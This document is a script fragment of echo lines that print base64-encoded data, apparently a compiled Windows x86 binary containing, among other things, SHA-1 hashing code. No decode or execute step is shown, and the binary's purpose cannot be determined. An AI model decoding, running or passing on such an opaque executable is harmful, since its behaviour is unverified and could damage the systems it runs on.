echo hCREAgAAiUQkJOiyAAAAiUQkGI1EJDhqAcdEJCxQAAAAx0QkMBGTQACJRCQ06EYB
echo AACNRCQYUP9UJBSL8FeJdCQU6DEBAACF9nRE/7QkTAIAAFPo+E0AAIt8JBCL8FYz
echo wFdmiQb/VCQcV/8VfHZBAFbon77//1mL+GpcWGY5RH7+dAxmiQR+M8BmiUR+AkdV
echo /xXYdEEAXoX/dRL/tCRIAgAAU+ioTQAAM8lmiQgr31PoK08AAF9dW4HEMAIAAMIM
echo AFWL7FFW/xU4dkEAi/CF9nQejUX8UFb/FTx2QQD/FUR1QQCLTfwryPfZG8n30SPx
echo i8Zei+Vdw1NWV4t8JBBqAFf/FTx2QQCLHUh1QQCL8P/TO/B1Wlf/FUB2QQCFwHRP
echo ahRo7IBBAOg2RgAAi/BZWYl+BP/Tauwz24kGV2aJXgj/Fdx1QQCoCHQExkYIAf8V
echo OHZBADv4dBdX/xX4dUEAhcB0DFNXxkYJAf8V/HVBAF8zwF5AW8IIAIN8JAQAU1ZX
echo dEv/dCQQaAeVQAD/FUR2QQCLNeyAQQCF9g+EhwAAADP/ix7/FUh1QQA5Rgh1F4B+
echo EAB0EWoDV1dXV2r+/3YM/xVIdkEAi/OF23XW61mLNeyAQQCF9nRPM/9Vix6Nbgj/
echo FUh1QQA5RQB1NYB+EQB0C2oB/3YM/xX8dUEAgH4QAHQRagNXV1dXav//dgz/FUh2
echo QQBVaOyAQQDoBUUAAFlZi/OF23W1XV9eW8IEAP90JAT/NciGQQDoDj4AAIXAdBf/
echo MP8VEHVBAP90JAT/NciGQQDopD0AAMIEAGoAagBqEOjfPAAAaDyWQABqBGoEo8yG
echo QQDopT4AAGjQhkEAo8iGQQD/FRh1QQDDU1ZX/3QkELsEAQAAU+i2SwAAU4v4V/81
echo FIBBAP8VTHVBAGjcMEEAV4vw6Gq8//9ZWYXAdRiNDHX4////UY1HCFBX6By8//+D
echo xAyD7gQr3lPoA00AADPAZokEd19eW8IEAItUJASLTCQIVjP2D7cCV2aFwHQji3wk
echo FIX/dBtmg/gidQNG6wZmiQGDwQKDwgJPD7cCZoXAdeEzwGaJAYvGX17DUVFTVVZX
echo /zXMhkEA6J07AACL6IPL/zPAi/D/Feh0QQCLfCQcD7cQZoXSD4TQAAAAi0wkHMdE
echo JBAgAAAAx0QkFCIAAABmO1QkEHULaiBag8ACZjkQdPgPtxDHRCQcAQAAAGY7VCQU
echo dS6DwAKL8A+3CGaFyXRjaiJaZjvKdAuDwAIPtwhmhcl18DPJZjkIdEmLyIPAAutE
echo ZoXSdEVqIIvwWWY70XTjg8ACaiJaZjkQdR6DwAIPtwhmhcl0HWY7ynQLg8ACD7cI
echo ZoXJdfBqIFkPtxBmhdJ1yuuwi8iLVCQc6wIz0jldAHUEhf91HYXSdAFDM9KL8g+3
echo EGaF0g+FRP///4X/dRWLw+sVhfZ0DSvOi8bR+YkP/0UA6wQzyYkPX15dW1lZw/81
echo zIZBAOh/OgAAagDoyv7//1nDVYvsUf81zIZBAINl/ADoYzoAAItNCIXJeAKJCI1F
echo /FZQ6KL+//9Z/3UMi/D/dfzoukkAAP91/FBW6En+//+DxAxQ6DdLAABei+VdwggA
echo g3wkBAB0GItEJAiFwHUFuCQwQQBQ/3QkCP8VVHVBAMIIAMzMzMzMzMzMzMzMzMzM
echo /3QkBOh3AAAAhcB0JKHwgEEAhcB0Av/QagDHBRxxQQD//////xVYdUEAUP8VXHVB
echo ADPAwgQAzMzMzMzMzMzMzItEJASj8IBBAMdEJATwmEAA6QoBAADMzMzMzMzMzMzM
echo /zX4gEEA/xVgdUEAxwX4gEEAAAAAAMPMzMzMzMzMzMyDPfSAQQAAi0wkBHQMxwX0
echo gEEAAAAAAOsJiwGLAKMccUEAiwGLQAyj6IZBAKEBcEEAo+yGQQCLAYE4BQAAwHUQ
echo g3gQAnIKi0AYo/CGQQDrCscF8IZBAAAAAACLQQSLgLAAAACj9IZBAItBBIuApAAA
echo AKP4hkEAi0EEi4CsAAAAo/yGQQCLQQSLgKgAAACjAIdBAItBBIuAtAAAAKMEh0EA
echo i0EEi4CgAAAAowiHQQCLQQSLgJwAAACjDIdBAItBBIuAxAAAAKMQh0EAi0EEi4DA
echo AAAAoxSHQQC4AQAAAMIEAItEJASFwHQigz34gEEAAHQKiUQkBP8lYHVBAFD/FWB1
echo QQCj+IBBAMIEAP81+IBBAP8VYHVBAMcF+IBBAAAAAADCBADMzMzMzMzMzMzMzMzM
echo i0wkBDPAVr5ENkEAjWQkADkMxegwQQB0CECD+BRy8esHizTF7DBBAIvOjVECjUkA
echo ZosBg8ECZoXAdfX/dCQMK8rR+VHod0cAACvG6wONSQAPtw6NdgJmiUww/maFyXXw
echo XsIIAMzMzMzMzMzMzMzMzP90JAT/NRxxQQDogf///8IEAMzMzMzMzMzMzMzMzMzM
echo /zUYh0EA/xXAdEEAw8zMzGoAaAAQAABqAP8VuHRBAKMYh0EAw8zMzMzMzMzMzMzM
echo i0QkBIXAdBJQagD/NRiHQQD/FWR1QQDCBAAzwMIEAMz/dCQEagD/NRiHQQD/FTx1
echo QQDCBADMzMzMzMzMzMzMzItEJASFwH4SUGoI/zUYh0EA/xU4dUEAwgQAM8DCBADM
echo U4tcJAhWM/ZXhdt0FIvzjU4CZosGg8YCZoXAdfUr8dH+/3QkFFbodUYAAIv4hfZ0
echo Do0MNlFTV+g7t///g8QMM8BmiQR3X15bwggAzMzMzMyLRCQIg/j/dRD/dCQM/3Qk
echo COia////wgwAUzPbhcBW/3QkFA+Yw0sj2FPoIUYAAItMJAyL8IXJdBmF23QVK86Q
echo D7cEMWaFwHQJZokGg8YCS3XuU+iIRwAAM8BmiQZeW8IMAMzMzMzMzMzMzMzMzMzM
echo Vot0JAxXi3wkFFf/dCQQVuiitv//g8QMjQQ+X17CDACLVCQEiwKLUgTCBADMzMzM
echo i1QkDIvKUzPbg+Efg3wkDP9WD5zDSyNcJBBXg/kZdViLfCQQg/v/dRaL341LAov/
echo ZosDg8MCZoXAdfUr2dH7/3QkHFPoZ0UAAIvwhf90GIXbdBQr/g+3BDdmhcB0CWaJ
echo BoPGAkt17lPo00YAADPAX2aJBl5bwhAAi3QkEFWD+QJ1I7np/QAAiUwkHIP7/3Qg
echo 9sJAdRZTVujURgAAi9i56f0AAOsGM8mJTCQcg/v/dRGL7o1VAYpFAEWEwHX4K+rr
echo EjPtgD4AdAs7630HRYA8LgB19YsdaHVBAGoAagBVVmoAUf/T/3QkIIvwVujARAAA
echo jU4Bi/hRV1X/dCQgagD/dCQw/9NdM8lmiQxHX15bwhAAxwVkhkEA4J1AAMcFcIZB
echo ADifQADHBXyGQQDPnkAAw1NVi2wkGFf/dQDo4AAAAIsdOHVBAGo8agD/NRCAQQD/
echo 04v4hf8PhJoAAABWi3QkJIX2fwMz9kaLxsHgAlBqCP81EIBBAP/TiUcEhcB0ZYtE
echo JBgzyYlHIItEJByJdySLdCQUUIkPiXcciUcQiU8oiU8siW8wiU806Ah8AACFwHQE
echo g08sAmoEaAAAAQBqEIPGCFboozkAAFZqCIlHOP81EIBBAP/TiUcMx0AEJDBBAIl9
echo AOsRV2oA/zUQgEEA/xU8dUEAM/9ei8dfXVvCFAD/dCQI/3QkCOj+AAAAhcB1DlD/
echo dCQM/3QkDOh3AQAAwggAV4t8JAiF/3RcU1VX6DoCAAD/dzjoXjoAAP93BIsdPHVB
echo ADPtVf81EIBBAP/T/3cMVf81EIBBAP/Ti0c0hcB0FFaLMFBV/zUQgEEA/9OLxoX2
echo de5ei0cwV1WJKP81EIBBAP/TXVtfwgQAVot0JAhXM/+F9nRtU4tcJBSF23RjiwaJ
echo RCQQi0YUiUQkFDl8JBh0BlPotAEAAFVW6C8CAADrJPZGLARX/3X8U3QH6CsCAADr
echo Bei9AAAAVf92EP92HFDoIXsAAFbozwIAAIvohe110ItEJBQz/4kGR4tEJBiJRhRd
echo W4vHX17CDABTi1wkDFVWV4XbdQW7JDBBAIt0JBRT9kYsAXQ56PECAAAz0vd2JItG
echo BIvqWYs8qOsUU/93BOgts///WVmFwHQLiX4Iiz+F/3Xo6zeJbhSNRwiJPusv6J0C
echo AAAz0vd2JItGBIvqWYs8qOsUU/93BOgGs///WVmFwHTSiX4Iiz+F/3XoM8BfXl1b
echo wggAg3wkDAFTi1wkDFVWi3QkEFd1IlNW6Fv///+L+IX/dBWDfhAAD4SDAAAA/3YQ
echo V+gUfQAA63iF23UFuyQwQQD2RiwBU3QH6D0CAADrBegbAgAAM9L3diRZ/3Y4i+ro
echo 2zQAAIv4hf90Z1PodbL//1mNBEUCAAAAUGoA/zUQgEEA/xU4dUEAU1CJRwToWrL/
echo /4tGBFlZiwSoiQeLRgSJPKiDZggA/0YoiT6DxwiJbhSF/3Qd/3YcagBX6HGv//+D
echo xAz2RiwCdAn/dhBX6H59AACLx19eXVvCDABVi+xRUVNWi3UIV1aLXhDobgAAAOs7
echo g+8I9kYsBHUR/3cEagD/NRCAQQD/FTx1QQCF23QKU41HCFDoMnwAAIsHV/92OIlF
echo +I1F+IkG6OA1AABW6PcAAACL+IX/dbmLRiTB4AJQV/92BOjprv//g8QMVugMAAAA
echo IX4oX15bi+VdwgQAi0QkBIMgAINIFP/CBACDfCQMAVOLXCQMVVZXi3wkFHUeU1fo
echo MgEAAIvwhfZ0EYN/EAB0Qf93EFbosXsAAOs2i8OZ938k/3c4i+rolDMAAIvwhfZ0
echo QYleBItHBIsEqIkGi0cEiTSog2cIAP9HKIk3g8YIiW8UhfZ0Hf93HGoAVuhQrv//
echo g8QM9kcsAnQJ/3cQVuhdfAAAX4vGXl1bwgwAi0wkBFaLQRQ7QSR9FItxBI0UhoM6
echo AHUNQIPCBDtBJHzyM8Bew4lBFIsEhl7DVot0JAiLBotOFIlGCIlOGIXAdQqD+f91
echo HCFGFOsOiwCJBoXAdRiNQQGJRhRW6KH///+JBlmDPgB1BDPA6wWLBoPACF7CBACL
echo TCQEM8DrC2nAPwABAI1JAgPCD7cRhdJ17sNWV4t8JAwz9g+3B1DrD2n2PwABAI1/
echo Ag+3D1ED8OhRsP//WYXAdedfi8Zew4tMJARWi3QkDIvGmfd5JItBBIsEkOsKOXAE
echo dA2JQQiLAIXAdfJewggAiQGDwAiJURTr8scFYIZBAEijQADHBWyGQQBkpkAAxwV4
echo hkEA2qNAAMNTVos1OHVBAFdqNGoA/zUQgEEA/9aLXCQUi/iF23UVaghT/zUQgEEA
echo /9aL2MZHMgEz0usFM9KIVzKLdCQQjUMEi0wkGIPGCIlHDItEJBxRiVcIiReJVwSJ
echo dyiJTxiJVxDGRzABiUcs6LB2AACDZyAAagRoAAABAGoQiEcxiV8kVok76Eo0AACJ
echo RxyLx19eW8IQAFeLfCQIhf90XFNVV+irAAAA/3cc6FM1AACLRyQz7YsdPHVBAIko
echo i0ckiWgEi0cghcB0FFaLMFBV/zUQgEEA/9OLxoX2de5egH8yAHQM/3ckVf81EIBB
echo AP/TV1X/NRCAQQD/011bX8IEAItEJASLQBDCBACLRCQEg2AIAMZAMAGLQAyDIADC
echo BACLTCQEi0EIhcB0DosAhcB0GP9BFIlBCOsNiwGDYRQAiUEIhcB0A4PACItRDItJ
echo CIkKwgQAU1VWi3QkEFeLXhiLPoXbdCrrFYs/jUUIU1Do1XgAAFX/dhzojTIAAIvv
echo hf915esRiz9Q/3Yc6HoyAACLx4X/de+LRgwzyYlOCF+JCIkOiU4EiU4QxkYwAV5d
echo W8IEAFaLdCQIV/92HOh9MAAAi/iF/w+EgQAAAFP/digz21NX6Fer//+DxAw4XjF0
echo DP92GI1HCFDoYnkAAP9GEItGCIXAdRuLBoXAdAOJeASLBol+CIkHiV8EiV4UiF4w
echo 6yGJRwSLRgiLAIkHi0YIiwCFwHQDiXgEi0YIiTj/RhSJfgiLTgg5WQR1AokOORlb
echo dQOJTgSLRgyJCI1HCF9ewgQAU1aLdCQQV4t8JBCLRxSJdxSF9g+IlgAAAItfEDvz
echo D42LAAAAgH8wAHQxi8OZK8LR+DvwfRGLD+sHhfZ0dIsJToXJdfXra4tPBCve6weF
echo 23Rgi0kES4XJdfTrVotPCDvwfigr3ivwO/N8DItPBOsUhfZ0PosJToXJdfXrNYXb
echo dDGLSQRLhcl19OsnK8Y7xnwMiw/rFYXAdBmLSQRIhcl19OsPhfZ0C4sJToXJdfXr
echo AjPJi0cMiU8IiQiFyXQJxkcwAI1BCOsGxkcwATPAX15bwggAVYvsVot1CDPAhfZ0
echo PzlFDHQ6OUUQdAj/dQzoE/7//1eLPusg/3UM6GT+//+LyI1HCFD/dhiLRiiD6AhQ
echo UegOdAAAiz+F/3XcM8BAX15dwgwAofyAQQCFwHQGUOgxMwAAw1WL7IHsDAIAAIN9
echo CAB0aWgEAQAA/3UIjYX0/f//UOgZrP//M8BmiUX8jYX0/f//UOgrrP//jY30/f//
echo g8QQjQRB6xYPt0j+g/kgdAqD+Vx0BYP5L3UNg8D+jY30/f//O8F34DPJZokIjYX0
echo /f//UVD/FWx1QQDrAjPAi+VdwgQAM8A5RCQEdAb/JXB1QQDCCABTVVZX/3QkFL4E
echo AQAAVuj3OgAAi/hXVv8VdHVBAGhsNkEAi9j/FUB1QQCL6IXtdB5oiDZBAFX/FSx1
echo QQCFwHQHVldX/9CL2FX/Fdh0QQAr81boRDwAADPAZokEX19eXVvCBACDfCQEAHQi
echo 9kQkCAJ0D2iAAAAA/3QkCP8VcHVBAP90JAT/FXh1QQDrAjPAwggAagD/dCQI6Mf/
echo ///CBABTVlf/dCQQvwQBAABX6Fk6AACL2FNX/xV8dUEAi/CF9nQPalxYZjlEc/50
echo BWaJBHNGK/5X6MI7AAAzwF9miQRzXlvCBABTVVZX/3QkGL0EAQAAM/ZV6BE6AACL
echo +ItEJBSD+AIPhYsAAABonDZBAP8VQHVBAIvYhdt0XGi0NkEAU/8VLHVBAKMAgUEA
echo hcB0PI1MJBhRVlZoIHFBAP/QhcB1Kv90JBhX6Iuq//9ozDZBAFfomKr//1fodKr/
echo /4PEFIvw/3QkGP8VfHZBAFP/Fdh0QQCF9nVSV2oo6JkAAABo0DZBAFfoZar//1fo
echo Qar//4PEDOsyg/gJdy//JIUyqUAAaibrGmoF6xZqGusSaiPrDmoO6wpqDesGaifr
echo AmouXldW6FEAAACL8CvuVejLOgAAM8BmiQR3X15dW8IIABSpQAD1qEAAHalAAPmo
echo QAD9qEAAAalAAAWpQAAJqUAADalAABGpQACDfCQEAHQG/yWAdUEAM8DCBABVi+xR
echo VleNRfwz9lBWVv91CFb/FWR2QQCLfQyFwHUzV/91/P8VaHZBAIXAdBxX6Iap//+L
echo 8FmF9nQPalxYZjlEd/50BWaJBHdG/3X8/xV8dkEAM8BmiQR3i8ZfXovlXcIIAMzM
echo V4t8JAiD//91D/81JIdBAOgQMAAAX8IEAFZX/zUkh0EA6GMqAACL8IX2dDGDfgQA
echo dBdW6DgAAAD/dgRqAP81EIBBAP8VPHVBAP82/xUQdUEAV/81JIdBAOjdKQAAXl/C
echo BADMzMzMzMzMzMzMzMzMzFFWi3QkDMdEJAQAAAAAg34UAHUoagCNRCQIUItGCCtG
echo DFD/dgT/Nv8VyHRBAItGCIlGDItEJAReWcIEADPAXlnCBADMzMzMzMzMzMzMzMzM
echo /zUkh0EA6FovAADDzMzMzGjQqUAAahBqIOh+KgAAoySHQQDDzMzMzMzMzMzMzMzM
echo g+wIU4tcJBxVVleL+zPtg+cfiXwkEHUIx0QkEAIAAAD/dCQc/zUkh0EA6KkpAACL
echo 8IX2D4SpAQAAi0QkJIP4AXU8M8D3wwAAAgB0BbgBAAAA98MAAAQAdAODyAdqAGiA
echo AAAAagNqAFBoAAAAgP90JDj/FYR1QQCL+OmuAAAAg/gCdTkzwPfDAAACAHQFuAEA
echo AAD3wwAABAB0A4PIB2oAaIAAAABqBGoAUGgAAADA/3QkOP8VhHVBAIv463CD+AN1
echo ZzPAiUQkKPfDAAACAHQJuAEAAACJRCQo98MAAAQAdAeDyAeJRCQoagBogAAAAGoC
echo agBQaAAAAMD/dCQ4/xWEdUEAi/iD//91LGoAagBqBWoA/3QkOGgAAABA/3QkOP8V
echo hHVBAIv46wSLfCQog///D4SWAAAAhf8PhI4AAAChMHFBAIXAdBz3wwAACAB1FFBq
echo AP81EIBBAP8VOHVBAIlGBOsDiW4EiT6hMHFBAIlGCItEJBCJRhgzwIN8JCQBiW4M
echo D5TAx0YUAQAAAIN8JCQCiUYcdRz3wwAAEAB0FGoCjUQkGIlsJBhQagBX/xWIdUEA
echo i0QkHIvug/j/dAKL74XtdA5fXovFXVuDxAjDi0QkHIP4/3QCi/BW/zUkh0EA6Ggn
echo AABfXovFXVuDxAjDzMzMzP90JAxqA/90JBD/dCQQ6P39//+DxBDCDADMzMzMzMzM
echo VYtsJAhWV1X/NSSHQQAz/+izJwAAi/CF9g+EqAAAAFNXaIAAAABqAldXaAAAAMD/
echo dCQw/xWEdUEAi9iD+/91HFdXagVXV2gAAABA/3QkMP8VhHVBAIvYg/v/dE+F23RL
echo oTBxQQCFwHQUUGoA/zUQgEEA/xU4dUEAiUYE6wOJfgSJHqEwcUEAiX4MiX4ci/6J
echo RgjHRhQBAAAAx0YYAgAAAIP9/3QCi/uF/3UTg/3/dAKL9Vb/NSSHQQDofCYAAFuL
echo x19eXcIIAIvHX15dwggAzP90JAxqAf90JBD/dCQQ6A39//+DxBDCDADMzMzMzMzM
echo U4tcJAhWV1P/NSSHQQAz/+jDJgAAi/CF9g+EjwAAAFVXaIAAAABqA1dXaAAAAID/
echo dCQw/xWEdUEAi+iD/f90UoXtdE6hMHFBAIXAdBNQV/81EIBBAP8VOHVBAIlGBOsD
echo iX4EiS6hMHFBAIl+DIv+iUYIx0YUAQAAAMdGGAIAAADHRhwBAAAAg/v/dAKL/YX/
echo dROD+/90AovzVv81JIdBAOilJQAAXYvHX15bwggAi8dfXlvCCADMzMzMzMzMzMzM
echo UYtUJAzHBCQAAAAAhdIPhOAAAABmgzoAD4TWAAAAi0wkEFaD+Rl1ZYt0JAyLyleD
echo fgQAjXkCdCjrBo2bAAAAAGaLAYPBAmaFwHX1K8/R+Y0ECVBSVuhGAQAAX15ZwgwA
echo ZosBg8ECZoXAdfUrz41EJAhqANH5UI0ECVBS/zb/Fch0QQCLRCQIX15ZwgwAM8CD
echo +QKNTCQQD5XAUUgl6f0AAFJQ6AkCAACL8IX2dD6LRCQMg3gEAHQR/3QkEFZQ6N4A
echo AACJRCQE6xRqAI1MJAhR/3QkGFb/MP8VyHRBAFZqAP81EIBBAP8VPHVBAItEJARe
echo WcIMADPAWcIMAMzMzMzMzP90JAT/NSSHQQDoyiQAAIXAdBD/cBj/dCQMUOjg/v//
echo wggAM8DCCADMzMzMzMzMzFFWi3QkEMdEJAQAAAAAhfZ0U1eLfCQYhf90Qv90JBD/
echo NSSHQQDofyQAAIXAdCWDeAQAdA5XVlDoNAAAAF9eWcIMAGoAjUwkDFFXVv8w/xXI
echo dEEAi0QkCF9eWcIMAF8zwF5ZwgwAM8BeWcIMAMzMzMyD7AxWi3QkFMdEJAQAAAAA
echo g34cAA+F7QAAAIN+FAF1K4tGDI1MJAxqAffYmVFQ/zaJRCQYiVQkHP8ViHVBAItG
echo CMdGFAAAAACJRgyLRgxXi3wkIDvHfnGLTggDTgQryIvHSHRPSHQ1g+gCdBtX/3Qk
echo IFHooKL//4PEDIvHKX4MX16DxAzCDACLRCQciwCJAYvHKX4MX16DxAzCDACLRCQc
echo ZosAZokBi8cpfgxfXoPEDMIMAItEJByKAIgBi8cpfgxfXoPEDMIMAFboUvn//4tG
echo CDv4fCBqAI1EJAxQV/90JCj/Nv8VyHRBAItEJAhfXoPEDMIMAItOBCtODFf/dCQg
echo A8jpav///zPAXoPEDMIMAFdqAGoAagBqAGr//3QkIGoA/3QkJP8VNHVBAIt8JBCJ
echo B4XAdDlWQFBqAP81EIBBAP8VOHVBAIvwhfZ0HWoAagD/N1Zq//90JCRqAP90JCj/
echo FTR1QQD/D4vGXl/CDAAzwF/CDACLTCQEjUFEUI1BBFDokQAAAFlZwgQA/3QkBGoA
echo /zUQgEEA/xU8dUEAwgQAVmjkAAAAagD/NRCAQQD/FTh1QQD/dCQMi/CNTkTHBqAA
echo AABR6CkBAABZWYvGXsIIAGoD6MkfAACFwHQcx0AEv7FAAMdACBuyQADHQAyUsUAA
echo x0AQqrFAADPAQMP/dCQMi0QkCP90JAyDwERQ6AYUAACDxAzCDABRUVNVVot0JBwz
echo 7VeL1YvCg+ADagNZK8jB4QOD+gQbwPfYi0SGFNPoiEQUEEKD+ghy3GoBaOg2QQBW
echo 6METAACNfhS7+AEAAOsNagFo7DZBAFboqhMAAIsHg8QMI8M9wAEAAHXlagiNRCQU
echo UFbojxMAAItcJCiDxAyL1YvCg+ADagNZK8iLwsHoAsHhA4sEhtPoiAQaQoP6FHLg
echo akCNRhxVUOiUnf//ahRVVuiLnf//aghVV+iCnf//agiNRCQ4VVDodZ3//2pAjUZg
echo VVDoaZ3//4PEPF9eXVtZWcOLTCQEi0QkCINhGACDYRQAxwEBI0Vnx0EEiavN78dB
echo CP7cupjHQQx2VDIQx0EQ8OHSw4lBXMOLRCQMg+xMhcB0FWpA/3QkWFDo2Z///4tE
echo JGSDxAzrCItEJFSJRCRYiwCLyItUJFDBwAgl/wD/AMHJCIHhAP8A/wvIiUwkPFOL
echo WgRViyqLzcHBBQNMJERWi3IMi8ZXi3oIM8eLUhAjwzPGwcsCA8GBwpl5gloD0IHG
echo mXmCWotEJGiLQASLyMHACCX/AP8AwckIgeEA/wD/C8iLxzPDiUwkUCPFi8ozx8HB
echo BQNMJFCBx5l5gloDwcHNAgPwi0QkaItACIvIwcAIwckIJf8A/wCB4QD/AP8LyIvD
echo iUwkODPFI8KLzsHBBTPDA0wkOAPBwcoCA/iLRCRoi0AMi8jByQjBwAiB4QD/AP8l
echo /wD/AAvIi8KJTCQUi8/BwQUDTCQUM8UjxoHDmXmCWjPFwc4CA8GBxZl5gloD2ItE
echo JGiLQBCLyMHACMHJCCX/AP8AgeEA/wD/C8iLwjPGiUwkECPHi8vBwQUzwgNMJBAD
echo wcHPAgPoi0QkaItAFIvIwckIwcAIgeEA/wD/Jf8A/wALyIvGiUwkPDPHI8OLzcHB
echo BTPGgcGZeYJawcsCA0wkPAPBA9CLRCRoi0AYi8jByQjBwAiB4QD/AP8l/wD/AAvI
echo i8eJTCRAM8MjxYvKwcEFM8eBwZl5glrBzQIDTCRAA8ED8ItEJGiLQByLyMHJCMHA
echo CIHhAP8A/yX/AP8AC8iLw4lMJESLzsHBBTPFI8KBwZl5gloDTCREM8MDwcHKAgP4
echo i0QkaItAIIvIwcAIJf8A/wDByQiB4QD/AP8LyIvCM8WJTCQcI8aLz8HBBTPFgcGZ
echo eYJawc4CA0wkHAPBA9iLRCRoi0Aki8jBwAgl/wD/AMHJCIHhAP8A/wvIi8KJTCQY
echo M8Yjx4vLM8LBwQWBwZl5glrBzwIDTCQYgcKZeYJaA8ED6ItEJGiLQCiLyMHACMHJ
echo CCX/AP8AgeEA/wD/C8iLxjPHiUwkICPDi83BwQUzxgNMJCADyMHLAotEJGgDyolM
echo JDTBwQWJXCQwi0Asi9DBygjBwAiB4gD/AP8l/wD/AAvQi8eJVCRIM8MjxQPRM8fB
echo zQID0IlsJFSLRCRogcaZeYJaA9aBx5l5glqLdCQ0i0Awi8jBwAgl/wD/AMHJCIHh
echo AP8A/wvIi8MzxYlMJCQjxovKM9jBwQUDTCQki0QkaAPZA9/BzgKLy4l0JDTBwQWL
echo QDSL+MHACCX/AP8Awc8IgecA/wD/C/iLxjPFiXwkKCPCA88z6MHKAotEJGgD6YtM
echo JDCBwZl5glqJVCRYA+mLQDiLzYv4wcEFwcAIwc8IJf8A/wCB5wD/AP8L+IvGM8KJ
echo fCQsI8MDzzPwwcsCi0QkaAPxi0wkVIHBmXmCWolcJFQD8YtAPIv4wc8IwcAIgecA
echo /wD/Jf8A/wAL+IvOi8LBwQUzw4l8JDAjxQP5M8KLTCQ0i1QkOAP4M1QkTIHBmXmC
echo WjNUJCgD+TNUJByLz4tEJGjRwsHBBQPKwc0CiRCLw4tUJBQzxTNUJFAjxjNUJCwz
echo 2DNUJBgD2YtMJFiLRCRogcGZeYJaA9nRwsHOAovLwcEFiVAEA8qLVCQQi8UzVCQ4
echo M8YzVCQwI8czVCQgiWwkNDPoi0QkaAPpi0wkVIHBmXmCWtHCA+nBzwKJUAiLzcHB
echo BYvHM8YD0YtMJDQjwzPGwcsCA9CBwZl5glqLRCQUA9GLTCRoMwEzRCRIM0QkPNHA
echo iUEMi8qJRCQUwcEFi8czw4HBmXmCWgNMJBQjxTPHwc0CA8GLTCRoA/CLRCQQM0EE
echo M0QkJDNEJEDRwIlBEIvOiUQkEIvDM8XBwQUzwoHBoevZbgNMJBADwcHKAgP4iVQk
echo OItEJGiLz8HBBYtQCDNUJCgzVCREM1QkPNHCiVAUgcKh69luA8qLxTNEJDgzxsHO
echo AgPBi0wkaAPYi0EMi9AzVCQsM1QkHDNUJEDRwolRGIvLiUQkFIHCoevZbsHBBYvH
echo M0QkOAPKM8bBzwIDwYtMJGgD6ItBEIvQM1QkMDNUJBgzVCRE0cKJRCQQi8eJURwz
echo w4vNM8bBwQUDygPBi0wkOIHGoevZboHBoevZbsHLAgPIi0QkaIlMJFjBwQWLEDNU
echo JCAzVCQcM1AU0cKJUCADyovHgceh69luM8MzxcHNAgPIi0QkaAPOi3QkWIlMJFTB
echo wQWLUAQzVCRIM1QkGDNQGNHCiVAkA8qLw4HDoevZbjPFM8bBzgIDyItEJGgDz4t8
echo JFSJTCRYwcEFi1AIM1QkJDNUJCAzUBzRwolQKAPKi1QkFIvFM1QkKDPGM1QkSDPH
echo A8jBzwKLRCRoA8uLXCRYiUwkVMHBBTNQINHCiVAsA8qLVCQQi8MzVCQsM8YzVCQk
echo M8cDwcHLAo2NoevZbgPIi0QkaIlMJFgzUCSLbCRUgcah69lu0cKJUDCLwzPFwcEF
echo A8rBzQKLVCQwM8czVCQoA8iLRCRoA86LdCRYgceh69luiUwkVMHBBTNQKDNQFNHC
echo iVA0A8qLw4HDoevZbjPFM8bBzgIDyItEJGgDz4t8JFSJTCRYwcEFixAzVCQsM1As
echo M1AY0cKJUDgDyovFM8Yzx8HPAgPIi0QkaAPLi1wkWIlMJFTBwQWLUAQzVCQwM1Aw
echo M1Ac0cKJUDwDyovGM8czw8HLAgPBjY2h69lui2wkVAPIi0QkaIlMJFjBwQWLUAgz
echo EDNQNDNQINHCiRADyovFM8czwwPIi0QkaIHGoevZbotUJBQDzot0JFiBx6Hr2W6J
echo TCRUM1AEM1A4M1Ak0cKJUATBwQUDysHNAotUJBCLxTPGwc4CM8OBw6Hr2W4DyItE
echo JGgDz4t8JFSJTCRYwcEFM1AIM1A8M1Ao0cKJUAgD0YtMJGiLxTPGgcWh69luM8fB
echo zwID0ItEJBQzAQPTM0EsM0EUi1wkWNHAiUEMi8qJRCQUi8Yzx8HBBQNMJBQzwwPB
echo wcsCi0wkaAPoi0QkEIHGoevZbjNBBDNBMDNBGNHAiUEQi82JRCQQi8fBwQUzwwNM
echo JBAzwgPIwcoCi0QkaAPOiVQkWIlMJFSLUAgzUDQzUByBx6Hr2W4zUBSLdCRY0cKJ
echo UBSLxTPDwcEFA8rBzQIzxoHDoevZbgPIA8+LfCRoiUwkWMHBBYtHDIvQM1c4M1cg
echo M1cYiUQkFIvF0cIDyolXGIt8JFQzxzPGwc8CA8GBxqHr2W4Dw4tcJGiJRCRIi0sQ
echo i9EzUzwzUyQzUxyJTCQ8i8jBwQWLxTPH0cIDyolTHItcJFgzwwPBwcsCi0wkaAPG
echo i9CJRCREi8PBwgUjRCRIizEzcSgzcSAzcRTRxolxIIvLC0wkSCPPC8iNgty8G48D
echo zgPNi2wkSAPBwc0Ci0wkaIlEJFCLcQQzcSwzcSSL0DNxGIvFI0QkRNHGiXEki80L
echo TCREI8vBwgULyAPOA8+LfCREjYLcvBuPwc8CA8GLTCRoiUQkSIvQi0QkUMHCBYtx
echo CDNxMDNxKDNxHNHGiXEoi8gLzyPHI80LyI2C3LwbjwPOi3QkFAPLi1wkUAPBwcsC
echo i0wkaIvQiUQkRIvDI0QkSMHCBTNxNDNxLDNxINHGiXEsi8sLTCRII88LyI2C3Lwb
echo jwPOi3QkPAPNi2wkSAPBwc0Ci0wkaIvQiUQkQIvFI0QkRMHCBTNxODNxMDNxJNHG
echo iXEwi80LTCREI8sLyI2C3LwbjwPOA88DwYt8JESLTCRoi9CJRCRIwc8CwcIFi8eL
echo cTwzcTQzcSgzcRQjRCRA0caJcTSLzwtMJEAjzQvIjYLcvBuPA84Dy4tcJEADwcHL
echo AotMJGiL0IlEJFCLwyNEJEjBwgWLMTNxODNxLDNxGNHGiXE4i8sLTCRII88LyI2C
echo 3LwbjwPOA82LbCRIA8HBzQKLTCRoi9CJRCREi0QkUMHCBYtxBDNxPDNxMDNxHNHG
echo iXE8i8gLzSPFI8sLyI2C3LwbjwPOA8+LfCRQA8HBzwKLTCRoi9DBwgWJRCRIi3EI
echo MzEzcTQzcSDRxokxi88LTCREI82LxyNEJEQLyI2C3LwbjwPOi3QkFAPLi1wkRAPB
echo wcsCi0wkaIvQiUQkQIvDI0QkSMHCBTNxBDNxODNxJNHGiXEEi8sLTCRII88LyI2C
echo 3LwbjwPOi3QkPAPNi2wkSAPBwc0Ci0wkaIvQiUQkUIvFI0QkQMHCBTNxCDNxPDNx
echo KNHGiXEIi80LTCRAI8sLyI2C3Lwbj4tUJGgDzgPPi3QkPIt8JEADwYtMJBQzCjNK
